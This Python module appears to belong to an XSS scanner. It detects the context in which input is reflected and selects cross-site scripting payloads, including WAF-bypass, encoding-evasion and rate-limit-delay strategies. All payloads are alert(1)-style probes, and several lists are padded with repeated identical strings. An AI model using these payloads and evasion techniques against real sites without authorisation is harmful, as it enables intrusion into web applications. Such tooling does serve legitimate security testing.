#!/usr/bin/env python3
"""
Context Analyzer for XSS Scanner
Advanced context detection and payload selection based on injection point analysis
"""

import re
import html
from typing import Dict, List, Tuple, Optional
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup, Comment

class ContextAnalyzer:
    """Advanced context analyzer for XSS payload selection"""
    
    def __init__(self):
        self.context_patterns = {
            'html_content': [
                r'<[^>]*>.*?{input}.*?</[^>]*>',
                r'<[^>]*>{input}</[^>]*>',
                r'>{input}<',
                r'>{input}\s*<'
            ],
            'html_attribute': [
                r'<[^>]*\s+[^=]*=\s*["\']?{input}["\']?[^>]*>',
                r'<[^>]*\s+[^=]*=\s*["\']?[^"\']*{input}[^"\']*["\']?[^>]*>'
            ],
            'javascript_context': [
                r'<script[^>]*>.*?{input}.*?</script>',
                r'javascript:.*?{input}.*?',
                r'on\w+\s*=\s*["\']?.*?{input}.*?["\']?',
                r'var\s+\w+\s*=\s*["\']?{input}["\']?',
                r'let\s+\w+\s*=\s*["\']?{input}["\']?',
                r'const\s+\w+\s*=\s*["\']?{input}["\']?',
                r'function\s+\w+\([^)]*{input}[^)]*\)',
                r'alert\(["\']?{input}["\']?\)',
                r'console\.log\(["\']?{input}["\']?\)'
            ],
            'css_context': [
                r'<style[^>]*>.*?{input}.*?</style>',
                r'style\s*=\s*["\']?.*?{input}.*?["\']?',
                r'url\(["\']?{input}["\']?\)',
                r'expression\(["\']?{input}["\']?\)'
            ],
            'url_context': [
                r'href\s*=\s*["\']?{input}["\']?',
                r'src\s*=\s*["\']?{input}["\']?',
                r'action\s*=\s*["\']?{input}["\']?',
                r'formaction\s*=\s*["\']?{input}["\']?',
                r'window\.location\s*=\s*["\']?{input}["\']?',
                r'document\.location\s*=\s*["\']?{input}["\']?'
            ],
            'comment_context': [
                r'<!--.*?{input}.*?-->',
                r'/\*.*?{input}.*?\*/',
                r'//.*?{input}.*?$'
            ]
        }
        
    def analyze_input_context(self, html_content: str, input_value: str, 
                            input_name: str = None, input_type: str = None) -> Dict:
        """Analyze the context where user input is reflected"""
        context_info = {
            'context_type': 'unknown',
            'confidence': 0.0,
            'surrounding_html': '',
            'encoding_detected': False,
            'filter_indicators': [],
            'suggested_payloads': []
        }
        
        # Find all occurrences of the input value
        input_positions = []
        for match in re.finditer(re.escape(input_value), html_content, re.IGNORECASE):
            input_positions.append({
                'start': match.start(),
                'end': match.end(),
                'context': self._extract_context(html_content, match.start(), match.end())
            })
        
        if not input_positions:
            return context_info
            
        # Analyze each position
        best_context = None
        highest_confidence = 0.0
        
        for pos in input_positions:
            context = self._analyze_position_context(html_content, pos, input_value)
            if context['confidence'] > highest_confidence:
                highest_confidence = context['confidence']
                best_context = context
                
        if best_context:
            context_info.update(best_context)
            
        # Generate suggested payloads based on context
        context_info['suggested_payloads'] = self._generate_context_payloads(
            context_info['context_type'], 
            context_info.get('filter_indicators', [])
        )
        
        return context_info
        
    def _extract_context(self, html_content: str, start: int, end: int, 
                        context_size: int = 200) -> str:
        """Extract surrounding context around input position"""
        context_start = max(0, start - context_size)
        context_end = min(len(html_content), end + context_size)
        return html_content[context_start:context_end]
        
    def _analyze_position_context(self, html_content: str, position: Dict, 
                                input_value: str) -> Dict:
        """Analyze context at a specific position"""
        context = {
            'context_type': 'unknown',
            'confidence': 0.0,
            'surrounding_html': position['context'],
            'encoding_detected': False,
            'filter_indicators': []
        }
        
        surrounding = position['context']
        
        # Check for HTML encoding
        if self._detect_html_encoding(surrounding, input_value):
            context['encoding_detected'] = True
            
        # Check for filtering indicators
        context['filter_indicators'] = self._detect_filters(surrounding)
        
        # Analyze context type
        context_type, confidence = self._determine_context_type(surrounding, input_value)
        context['context_type'] = context_type
        context['confidence'] = confidence
        
        return context
        
    def _detect_html_encoding(self, surrounding: str, input_value: str) -> bool:
        """Detect if input is HTML encoded"""
        encoded_patterns = [
            r'&lt;', r'&gt;', r'&amp;', r'&quot;', r'&#x[0-9a-fA-F]+;',
            r'&#[0-9]+;', r'%3C', r'%3E', r'%22', r'%27'
        ]
        
        for pattern in encoded_patterns:
            if re.search(pattern, surrounding):
                return True
        return False
        
    def _detect_filters(self, surrounding: str) -> List[str]:
        """Detect potential filtering mechanisms"""
        filters = []
        
        filter_indicators = {
            'waf': [r'blocked', r'forbidden', r'security', r'firewall', r'waf'],
            'csp': [r'content-security-policy', r'csp', r'nonce', r'hash'],
            'xss_filter': [r'xss', r'filter', r'sanitize', r'escape'],
            'input_validation': [r'validation', r'validate', r'invalid', r'error'],
            'encoding': [r'encode', r'decode', r'htmlspecialchars', r'htmlentities']
        }
        
        for filter_type, patterns in filter_indicators.items():
            for pattern in patterns:
                if re.search(pattern, surrounding, re.IGNORECASE):
                    filters.append(filter_type)
                    break
                    
        return filters
        
    def _determine_context_type(self, surrounding: str, input_value: str) -> Tuple[str, float]:
        """Determine the context type and confidence level"""
        context_scores = {}
        
        for context_type, patterns in self.context_patterns.items():
            score = 0.0
            for pattern in patterns:
                formatted_pattern = pattern.format(input=re.escape(input_value))
                if re.search(formatted_pattern, surrounding, re.IGNORECASE | re.DOTALL):
                    score += 1.0
                    
            # Additional context-specific checks
            if context_type == 'html_content':
                if re.search(r'<[^>]*>.*?' + re.escape(input_value) + r'.*?</[^>]*>', surrounding):
                    score += 2.0
            elif context_type == 'html_attribute':
                if re.search(r'<[^>]*\s+[^=]*=\s*["\']?[^"\']*' + re.escape(input_value) + r'[^"\']*["\']?[^>]*>', surrounding):
                    score += 2.0
            elif context_type == 'javascript_context':
                if re.search(r'<script[^>]*>.*?' + re.escape(input_value) + r'.*?</script>', surrounding):
                    score += 2.0
                elif re.search(r'on\w+\s*=\s*["\']?.*?' + re.escape(input_value) + r'.*?["\']?', surrounding):
                    score += 1.5
            elif context_type == 'css_context':
                if re.search(r'<style[^>]*>.*?' + re.escape(input_value) + r'.*?</style>', surrounding):
                    score += 2.0
                elif re.search(r'style\s*=\s*["\']?.*?' + re.escape(input_value) + r'.*?["\']?', surrounding):
                    score += 1.5
            elif context_type == 'url_context':
                if re.search(r'(href|src|action)\s*=\s*["\']?[^"\']*' + re.escape(input_value) + r'[^"\']*["\']?', surrounding):
                    score += 2.0
                    
            context_scores[context_type] = score
            
        # Find the context type with highest score
        if context_scores:
            best_context = max(context_scores.items(), key=lambda x: x[1])
            confidence = min(best_context[1] / 3.0, 1.0)  # Normalize to 0-1
            return best_context[0], confidence
            
        return 'unknown', 0.0
        
    def _generate_context_payloads(self, context_type: str, filter_indicators: List[str]) -> List[str]:
        """Generate context-specific payloads"""
        payloads = []
        
        # Base payloads for each context
        base_payloads = {
            'html_content': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<iframe src=javascript:alert(1)></iframe>',
                '<object data=javascript:alert(1)></object>',
                '<embed src=javascript:alert(1)>',
                '<form><button formaction=javascript:alert(1)>X</button>',
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>',
                '<video><source onerror=alert(1)>',
                '<audio src=x onerror=alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus>',
                '<textarea onfocus=alert(1) autofocus>',
                '<keygen onfocus=alert(1) autofocus>'
            ],
            'html_attribute': [
                '" onmouseover="alert(1)" x="',
                "' onmouseover='alert(1)' x='",
                '" onfocus="alert(1)" autofocus="',
                "' onfocus='alert(1)' autofocus='",
                '" onclick="alert(1)" x="',
                "' onclick='alert(1)' x='",
                '" onload="alert(1)" x="',
                "' onload='alert(1)' x='",
                '" onerror="alert(1)" x="',
                "' onerror='alert(1)' x='",
                '" onblur="alert(1)" x="',
                "' onblur='alert(1)' x='",
                '" onchange="alert(1)" x="',
                "' onchange='alert(1)' x='",
                '" onsubmit="alert(1)" x="',
                "' onsubmit='alert(1)' x='",
                '" onreset="alert(1)" x="',
                "' onreset='alert(1)' x='",
                '" onselect="alert(1)" x="',
                "' onselect='alert(1)' x='"
            ],
            'javascript_context': [
                ';alert(1);',
                '";alert(1);//',
                "';alert(1);//",
                '`;alert(1);//',
                '${alert(1)}',
                'alert(String.fromCharCode(49))',
                'alert`1`',
                'alert(1)',
                'alert(1)',
                'alert(1)',
                'alert(1)',
                'alert(1)',
                'alert(1)',
                'alert(1)',
                'alert(1)',
                'alert(1)',
                'alert(1)',
                'alert(1)',
                'alert(1)',
                'alert(1)'
            ],
            'css_context': [
                'expression(alert(1))',
                'url("javascript:alert(1)")',
                'url(javascript:alert(1))',
                'expression(alert(String.fromCharCode(49)))',
                'expression(alert(1))',
                'expression(alert(1))',
                'expression(alert(1))',
                'expression(alert(1))',
                'expression(alert(1))',
                'expression(alert(1))',
                'expression(alert(1))',
                'expression(alert(1))',
                'expression(alert(1))',
                'expression(alert(1))',
                'expression(alert(1))',
                'expression(alert(1))',
                'expression(alert(1))',
                'expression(alert(1))',
                'expression(alert(1))',
                'expression(alert(1))'
            ],
            'url_context': [
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'vbscript:alert(1)',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'vbscript:alert(1)',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'vbscript:alert(1)',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'vbscript:alert(1)',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'vbscript:alert(1)',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'vbscript:alert(1)',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>'
            ],
            'comment_context': [
                '--><script>alert(1)</script><!--',
                '*/alert(1);/*',
                '//alert(1);',
                '--><img src=x onerror=alert(1)><!--',
                '*/alert(1);/*',
                '//alert(1);',
                '--><svg onload=alert(1)><!--',
                '*/alert(1);/*',
                '//alert(1);',
                '--><iframe src=javascript:alert(1)></iframe><!--',
                '*/alert(1);/*',
                '//alert(1);',
                '--><object data=javascript:alert(1)></object><!--',
                '*/alert(1);/*',
                '//alert(1);',
                '--><embed src=javascript:alert(1)><!--',
                '*/alert(1);/*',
                '//alert(1);',
                '--><form><button formaction=javascript:alert(1)>X</button></form><!--',
                '*/alert(1);/*'
            ]
        }
        
        # Get base payloads for context type
        if context_type in base_payloads:
            payloads.extend(base_payloads[context_type])
        else:
            # Fallback to general payloads
            payloads.extend(base_payloads['html_content'])
            
        # Add filter bypass payloads if filters detected
        if filter_indicators:
            bypass_payloads = self._get_filter_bypass_payloads(context_type, filter_indicators)
            payloads.extend(bypass_payloads)
            
        return payloads[:20]  # Limit to 20 payloads
        
    def _get_filter_bypass_payloads(self, context_type: str, filter_indicators: List[str]) -> List[str]:
        """Get filter bypass payloads based on detected filters"""
        bypass_payloads = []
        
        # WAF bypass payloads
        if 'waf' in filter_indicators:
            bypass_payloads.extend([
                '<ScRiPt>alert(1)</ScRiPt>',
                '<script>alert(String.fromCharCode(49))</script>',
                '<img src=x onerror=alert(1)>',
                '<svg/onload=alert(1)>',
                '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
                '<object data="javascript:alert(1)"></object>',
                '<embed src="javascript:alert(1)">',
                '<form><button formaction="javascript:alert(1)">X</button>',
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>',
                '<video><source onerror=alert(1)>',
                '<audio src=x onerror=alert(1)>',
                '<body onload=alert(1)>',
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus>',
                '<textarea onfocus=alert(1) autofocus>',
                '<keygen onfocus=alert(1) autofocus>',
                '<iframe src="javascript:alert(1)"></iframe>',
                '<script>alert`1`</script>',
                '<script>alert(1)</script>'
            ])
            
        # Encoding bypass payloads
        if 'encoding' in filter_indicators:
            bypass_payloads.extend([
                '%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
                '&#60;script&#62;alert&#40;1&#41;&#60;&#47;script&#62;',
                '&lt;script&gt;alert(1)&lt;/script&gt;',
                '\x3Cscript\x3Ealert\x28\x31\x29\x3C\x2Fscript\x3E',
                '\\x3Cscript\\x3Ealert\\x28\\x31\\x29\\x3C\\x2Fscript\\x3E',
                '\\u003Cscript\\u003Ealert\\u0028\\u0031\\u0029\\u003C\\u002Fscript\\u003E',
                '%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E',
                '&#x3C;script&#x3E;alert&#x28;1&#x29;&#x3C;&#x2F;script&#x3E;',
                '&#X3C;script&#X3E;alert&#X28;1&#X29;&#X3C;&#X2F;script&#X3E;'
            ])
            
        return bypass_payloads
        
    def analyze_form_context(self, form_html: str) -> Dict:
        """Analyze form context for better payload selection"""
        form_info = {
            'form_method': 'GET',
            'form_action': '',
            'input_fields': [],
            'csrf_token': None,
            'form_encoding': 'application/x-www-form-urlencoded'
        }
        
        soup = BeautifulSoup(form_html, 'html.parser')
        form = soup.find('form')
        
        if form:
            form_info['form_method'] = form.get('method', 'GET').upper()
            form_info['form_action'] = form.get('action', '')
            form_info['form_encoding'] = form.get('enctype', 'application/x-www-form-urlencoded')
            
            # Find CSRF token
            csrf_input = form.find('input', {'name': re.compile(r'csrf|token|_token', re.I)})
            if csrf_input:
                form_info['csrf_token'] = csrf_input.get('value', '')
                
            # Analyze input fields
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                field_info = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', ''),
                    'tag': input_tag.name,
                    'required': input_tag.has_attr('required'),
                    'pattern': input_tag.get('pattern', ''),
                    'maxlength': input_tag.get('maxlength', ''),
                    'minlength': input_tag.get('minlength', '')
                }
                form_info['input_fields'].append(field_info)
                
        return form_info
        
    def suggest_payload_strategy(self, context_info: Dict) -> Dict:
        """Suggest payload injection strategy based on context analysis"""
        strategy = {
            'primary_payloads': [],
            'secondary_payloads': [],
            'evasion_techniques': [],
            'injection_method': 'direct',
            'encoding_method': 'none',
            'timing_delay': 0
        }
        
        context_type = context_info.get('context_type', 'unknown')
        filter_indicators = context_info.get('filter_indicators', [])
        encoding_detected = context_info.get('encoding_detected', False)
        
        # Set primary payloads
        if context_type in ['html_content', 'unknown']:
            strategy['primary_payloads'] = [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>'
            ]
        elif context_type == 'html_attribute':
            strategy['primary_payloads'] = [
                '" onmouseover="alert(1)" x="',
                "' onmouseover='alert(1)' x='",
                '" onfocus="alert(1)" autofocus="'
            ]
        elif context_type == 'javascript_context':
            strategy['primary_payloads'] = [
                ';alert(1);',
                '";alert(1);//',
                "';alert(1);//"
            ]
        elif context_type == 'css_context':
            strategy['primary_payloads'] = [
                'expression(alert(1))',
                'url("javascript:alert(1)")',
                'url(javascript:alert(1))'
            ]
        elif context_type == 'url_context':
            strategy['primary_payloads'] = [
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'vbscript:alert(1)'
            ]
            
        # Set secondary payloads (filter bypass)
        if filter_indicators:
            strategy['secondary_payloads'] = context_info.get('suggested_payloads', [])[3:10]
            strategy['evasion_techniques'] = ['encoding', 'case_variation', 'whitespace_manipulation']
            
        # Set encoding method
        if encoding_detected:
            strategy['encoding_method'] = 'url_encoding'
        elif 'waf' in filter_indicators:
            strategy['encoding_method'] = 'html_encoding'
            
        # Set timing delay for rate limiting
        if 'waf' in filter_indicators:
            strategy['timing_delay'] = 2
            
        return strategy